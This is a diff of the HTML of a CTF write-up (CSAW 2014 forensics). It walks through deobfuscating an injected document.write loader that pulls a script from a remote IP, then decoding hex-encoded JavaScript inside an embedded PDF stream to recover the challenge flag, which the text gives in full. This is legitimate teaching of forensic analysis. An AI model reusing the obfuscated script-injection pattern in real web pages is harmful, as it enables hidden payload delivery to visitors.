+&lt; document.write<span class="o">(</span><span class="s2">&quot;&lt;&quot;</span> + m + <span class="s2">&quot; &quot;</span> + b + <span class="s2">&quot;=&quot;</span> + x + <span class="s2">&quot;tp:&quot;</span> + k + k + f + i + <span class="s2">&quot;y&quot;</span> + g + <span class="s2">&quot;c&quot;</span> + u + v + <span class="s2">&quot;j&quot;</span> + u + <span class="s2">&quot;\&#39;&gt;\&lt;/&quot;</span> + m + <span class="s2">&quot;\&gt;&quot;</span><span class="o">)</span>;
 </pre></div>
 
 
@@ -442,145 +442,145 @@ Sep <span class="m">17</span> <span class="m">19</span>:20:55 ubuntu sudo:   ubu
 <p>In JavaScript, the function <code>document.write()</code> writes HTML expressions or JavaScript code to a document. However, we can debug it in the console if we want, changing it to <code>console.log()</code> (and changing any <code>document</code> word to <code>console</code>).</p>
 <p>To run JavaScript in the console, you need to install <a href="http://nodejs.org/">Node</a>.</p>
 <p>So we run and we get a URL:</p>
-<div class="highlight"><pre><span></span>$ node html5.js
+<div class="highlight"><pre><span class="nv">$ </span>node html5.js
 &lt;script <span class="nv">src</span><span class="o">=</span><span class="s1">&#39;http://128.238.66.100/analytics.js&#39;</span>&gt;&lt;/script&gt;
 </pre></div>
 
 
-<hr>
+<hr />
 <h2>Analyzing the Second JavaScript Exploit</h2>
 <p>Awesome, we see a script exploit! Let's get it!</p>
-<div class="highlight"><pre><span></span>$  wget http://128.238.66.100/analytics.js
---2014-09-25 <span class="m">19</span>:17:19--  http://128.238.66.100/analytics.js
-Connecting to <span class="m">128</span>.238.66.100:80... connected.
-HTTP request sent, awaiting response... <span class="m">200</span> OK
-Length: <span class="m">16072</span> <span class="o">(</span>16K<span class="o">)</span> <span class="o">[</span>application/javascript<span class="o">]</span>
+<div class="highlight"><pre><span class="nv">$ </span> wget http://128.238.66.100/analytics.js
+--2014-09-25 19:17:19--  http://128.238.66.100/analytics.js
+Connecting to 128.238.66.100:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16072 <span class="o">(</span>16K<span class="o">)</span> <span class="o">[</span>application/javascript<span class="o">]</span>
 Saving to: ‘analytics.js’
 
-<span class="m">100</span>%<span class="o">[===============================================================================</span>&gt;<span class="o">]</span> <span class="m">16</span>,072      --.-K/s   in <span class="m">0</span>.008s
+100%<span class="o">[===============================================================================</span>&gt;<span class="o">]</span> 16,072      --.-K/s   in 0.008s
 
-<span class="m">2014</span>-09-25 <span class="m">19</span>:17:19 <span class="o">(</span><span class="m">2</span>.02 MB/s<span class="o">)</span> - ‘analytics.js’ saved <span class="o">[</span><span class="m">16072</span>/16072<span class="o">]</span>
+2014-09-25 19:17:19 <span class="o">(</span>2.02 MB/s<span class="o">)</span> - ‘analytics.js’ saved <span class="o">[</span>16072/16072<span class="o">]</span>
 </pre></div>
 
 
 <p>The file turns out to be large, and <em>grep</em> <em>flag</em> or <em>key</em> doesn't show any hit. No IP addresses or URL neither.</p>
 <p>OK, let's take a closer look. We open the file in a text editor and we find a weird hex-encoded variable that is completely unconnected from the rest:</p>
-<div class="highlight"><pre><span></span>var _0x91fe = [&quot;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&quot;, &quot;\x5F\x73\x65\x6C\x66&quot;, &quot;\x6F\x70\x65\x6E&quot;];
-window[_0x91fe[2]](_0x91fe[0], _0x91fe[1]);
+<div class="highlight"><pre><span class="n">var</span> <span class="n">_0x91fe</span> <span class="o">=</span> <span class="p">[</span><span class="s">&quot;</span><span class="se">\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x5F\x73\x65\x6C\x66</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x6F\x70\x65\x6E</span><span class="s">&quot;</span><span class="p">];</span>
+<span class="n">window</span><span class="p">[</span><span class="n">_0x91fe</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="n">_0x91fe</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">_0x91fe</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
 </pre></div>
 
 
 <p>We decode it using Python or a <a href="http://ddecode.com/hexdecoder/">online hex-decode</a> and we get another file:</p>
-<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x5F\x73\x65\x6C\x66</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x6F\x70\x65\x6E</span><span class="s2">&quot;</span><span class="p">)</span>
-<span class="p">(</span><span class="s1">&#39;http://128.238.66.100/announcement.pdf&#39;</span><span class="p">,</span> <span class="s1">&#39;_self&#39;</span><span class="p">,</span> <span class="s1">&#39;open&#39;</span><span class="p">)</span>
+<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x5F\x73\x65\x6C\x66</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x6F\x70\x65\x6E</span><span class="s">&quot;</span><span class="p">)</span>
+<span class="p">(</span><span class="s">&#39;http://128.238.66.100/announcement.pdf&#39;</span><span class="p">,</span> <span class="s">&#39;_self&#39;</span><span class="p">,</span> <span class="s">&#39;open&#39;</span><span class="p">)</span>
 </pre></div>
 
 
 <p>Opening the URL leads to this picture:
-<img alt="" src="http://i.imgur.com/CNEQhfG.png"></p>
+<img alt="" src="http://i.imgur.com/CNEQhfG.png" /></p>
 <p>LOL. Funny, but no flag yet...</p>
 <p>It should be in the PDF somewhere!</p>
-<hr>
+<hr />
 <h2>Finding the Second Hex-encoded String: Approach I</h2>
 <p>All right, let's use what we learned from the <a href="http://bt3gl.github.io/forensics-200-obscurity.html">CSAW CTF 2014 Forensic -Obscurity</a> problem. First, let's see if we find the flag with a simple grep:</p>
-<div class="highlight"><pre><span></span>$./pdf-parser.py announcement.pdf <span class="p">|</span> grep flag
-$./pdf-parser.py announcement.pdf <span class="p">|</span> grep key
+<div class="highlight"><pre><span class="nv">$.</span>/pdf-parser.py announcement.pdf | grep flag
+<span class="nv">$.</span>/pdf-parser.py announcement.pdf | grep key
 </pre></div>
 
 
 <p>No luck. Let us ID the file to see if we find any funny stream:</p>
-<div class="highlight"><pre><span></span>$ ./pdfid.py announcement.pdf PDFiD <span class="m">0</span>.1.2 announcement.pdf
+<div class="highlight"><pre><span class="nv">$ </span>./pdfid.py announcement.pdf PDFiD 0.1.2 announcement.pdf
  PDF Header: %PDF-1.4
- obj                    <span class="m">9</span>
- endobj                 <span class="m">9</span>
- stream                 <span class="m">4</span>
- endstream              <span class="m">4</span>
- xref                   <span class="m">1</span>
- trailer                <span class="m">1</span>
- startxref              <span class="m">1</span>
- /Page                  <span class="m">1</span>
- /Encrypt               <span class="m">0</span>
- /ObjStm                <span class="m">0</span>
- /JS                    <span class="m">0</span>
- /JavaScript            <span class="m">0</span>
- /AA                    <span class="m">0</span>
- /OpenAction            <span class="m">0</span>
- /AcroForm              <span class="m">0</span>
- /JBIG2Decode           <span class="m">0</span>
- /RichMedia             <span class="m">0</span>
- /Launch                <span class="m">0</span>
- /EmbeddedFile          <span class="m">1</span>
- /XFA                   <span class="m">0</span>
- /Colors &gt; <span class="m">2</span>^24         <span class="m">0</span>
+ obj                    9
+ endobj                 9
+ stream                 4
+ endstream              4
+ xref                   1
+ trailer                1
+ startxref              1
+ /Page                  1
+ /Encrypt               0
+ /ObjStm                0
+ /JS                    0
+ /JavaScript            0
+ /AA                    0
+ /OpenAction            0
+ /AcroForm              0
+ /JBIG2Decode           0
+ /RichMedia             0
+ /Launch                0
+ /EmbeddedFile          1
+ /XFA                   0
+ /Colors &gt; 2^24         0
 </pre></div>
 
 
 <p>Oh, cool, there is a <strong>Embedded File</strong>! Let's look closer to this object:</p>
-<div class="highlight"><pre><span></span>$ ./pdf-parser.py --stats announcement.pdf Comment: <span class="m">3</span>
-XREF: <span class="m">1</span>
-Trailer: <span class="m">1</span>
-StartXref: <span class="m">1</span>
-Indirect object: <span class="m">9</span>
-  <span class="m">2</span>: <span class="m">3</span>, <span class="m">7</span>
- /Catalog <span class="m">1</span>: <span class="m">6</span>
- /EmbeddedFile <span class="m">1</span>: <span class="m">8</span>
- /Filespec <span class="m">1</span>: <span class="m">9</span>
- /Page <span class="m">1</span>: <span class="m">5</span>
- /Pages <span class="m">1</span>: <span class="m">4</span>
- /XObject <span class="m">2</span>: <span class="m">1</span>, <span class="m">2</span>
+<div class="highlight"><pre><span class="nv">$ </span>./pdf-parser.py --stats announcement.pdf Comment: 3
+XREF: 1
+Trailer: 1
+StartXref: 1
+Indirect object: 9
+  2: 3, 7
+ /Catalog 1: 6
+ /EmbeddedFile 1: 8
+ /Filespec 1: 9
+ /Page 1: 5
+ /Pages 1: 4
+ /XObject 2: 1, 2
 </pre></div>
 
 
 <p>Nice. So now we can decode our pdf file using the <strong>object code</strong>, which we can see  above that is <strong>8</strong>:</p>
-<div class="highlight"><pre><span></span>$ ./pdf-parser.py --object <span class="m">8</span> --raw --filter announcement.pdf
-obj <span class="m">8</span> <span class="m">0</span>
+<div class="highlight"><pre><span class="nv">$ </span>./pdf-parser.py --object 8 --raw --filter announcement.pdf
+obj 8 0
  Type: /EmbeddedFile
  Referencing:
  Contains stream
 
   &lt;&lt;
-    /Length <span class="m">212</span>
+    /Length 212
     /Type /EmbeddedFile
     /Filter /FlateDecode
     /Params
       &lt;&lt;
-        /Size <span class="m">495</span>
+        /Size 495
         /Checksum &lt;7f0104826bde58b80218635f639b50a9&gt;
       &gt;&gt;
     /Subtype /application/pdf
   &gt;&gt;
 
- var <span class="nv">_0xee0b</span><span class="o">=[</span><span class="s2">&quot;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&quot;</span><span class="o">]</span><span class="p">;</span>var <span class="nv">y</span><span class="o">=</span>_0xee0b<span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="p">;</span>
+ var <span class="nv">_0xee0b</span><span class="o">=[</span><span class="s2">&quot;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&quot;</span><span class="o">]</span>;var <span class="nv">y</span><span class="o">=</span>_0xee0b<span class="o">[</span>0<span class="o">]</span>;
 </pre></div>
 
 
 <p>Which <em>finally</em> leads to our flag!</p>
-<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D</span><span class="s2">&quot;</span><span class="p">)</span>
+<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D</span><span class="s">&quot;</span><span class="p">)</span>
 <span class="n">YOU</span> <span class="n">DID</span> <span class="n">IT</span><span class="err">!</span> <span class="n">CONGRATS</span><span class="err">!</span> <span class="n">fwiw</span><span class="p">,</span> <span class="n">javascript</span> <span class="n">obfuscation</span> <span class="ow">is</span> <span class="n">sofa</span> <span class="n">king</span> <span class="n">dumb</span>  <span class="p">:)</span> <span class="n">key</span><span class="p">{</span><span class="n">Those</span> <span class="n">Fluffy</span> <span class="n">Bunnies</span> <span class="n">Make</span> <span class="n">Tummy</span> <span class="n">Bumpy</span><span class="p">}</span>
 </pre></div>
 
 
-<hr>
+<hr />
 <h2>Finding the Second Hex-encoded String: Approach II</h2>
 <p>There is a nice tool called <a href="http://qpdf.sourceforge.net/">qpdf</a> that can be very useful here:</p>
-<div class="highlight"><pre><span></span>$ sudp yum install qpdf
+<div class="highlight"><pre><span class="nv">$ </span>sudp yum install qpdf
 </pre></div>
 
 
 <p>Now, we just do the following conversion:</p>
-<div class="highlight"><pre><span></span>$ qpdf  --qdf  announcement.pdf  unpacked.pdf
+<div class="highlight"><pre><span class="nv">$ </span>qpdf  --qdf  announcement.pdf  unpacked.pdf
 </pre></div>
 
 
 <p>Opening <em>unpacket.pdf</em> with <a href="http://tarot.freeshell.org/leafpad/">l3afpad</a> also leads to the flag :</p>
-<div class="highlight"><pre><span></span>stream
-var _0xee0b=[&quot;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&quot;];var y=_0xee0b[0];
-endstream
-endobj
+<div class="highlight"><pre><span class="n">stream</span>
+<span class="n">var</span> <span class="n">_0xee0b</span><span class="o">=</span><span class="p">[</span><span class="s">&quot;</span><span class="se">\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D</span><span class="s">&quot;</span><span class="p">];</span><span class="n">var</span> <span class="n">y</span><span class="o">=</span><span class="n">_0xee0b</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="n">endstream</span>
+<span class="n">endobj</span>
 </pre></div>
 
 
-<hr>
+<hr />
 <p><strong>That's it! Hack all the things!</strong></p>
                 </div><!-- /.entry-content -->
         </article>
